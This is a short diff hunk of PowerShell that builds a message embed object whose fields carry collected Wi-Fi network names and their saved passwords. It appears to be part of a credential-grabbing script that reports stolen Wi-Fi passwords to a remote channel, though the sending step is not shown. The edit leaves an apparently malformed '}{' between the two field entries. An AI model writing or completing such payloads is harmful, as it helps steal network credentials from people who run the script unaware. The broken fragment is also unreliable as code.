@@ -28,7 +28,7 @@ $forEmbed =  [PSCustomObject]@{
     'color'       = '16744960'
     'fields'   = @(@{
     'value' = [string]$wifinames
-    }
+    }{
     'value' = [string]$wifipass 
     })
 }
